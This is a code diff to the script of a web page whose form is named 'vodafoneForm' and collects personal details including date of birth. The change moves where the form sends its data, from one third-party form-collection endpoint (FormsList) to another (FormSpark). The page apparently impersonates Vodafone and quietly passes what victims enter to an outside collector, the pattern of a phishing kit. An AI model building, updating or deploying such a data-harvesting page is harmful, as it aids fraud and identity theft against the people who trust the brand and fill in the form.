@@ -189,8 +189,8 @@
 </div>
 
 <script>
-// ============ YOUR FORMSLIST ENDPOINT ============
-const FORMSLIST_URL = "https://formslist.com/f/wOp1Gr7qxbyS";
+// ============ YOUR FORMSPARK ENDPOINT ============
+const FORMSPARK_URL = "https://submit-form.com/EJK0vcKUE";
 
 const form = document.getElementById('vodafoneForm');
 const toast = document.getElementById('toastMsg');
@@ -223,16 +223,19 @@ function resetForm() {
   document.getElementById('dobYear').value = '';
 }
 
-async function sendToFormsList(formData) {
+async function sendToFormSpark(formData) {
   try {
-    const response = await fetch(FORMSLIST_URL, {
+    const response = await fetch(FORMSPARK_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
       body: JSON.stringify(formData)
     });
     
     if (response.ok) {
-      console.log('Form submitted successfully to FormsList');
+      console.log('Form submitted successfully to FormSpark');
       return true;
     } else {
       console.error('Submission failed:', response.status);
@@ -354,7 +357,7 @@ document.getElementById('submitBtn').addEventListener('click', async function(e)
   submitBtn.disabled = true;
   submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
   
-  const submitted = await sendToFormsList(formData);
+  const submitted = await sendToFormSpark(formData);
   
   setTimeout(() => {
     if (submitted) {
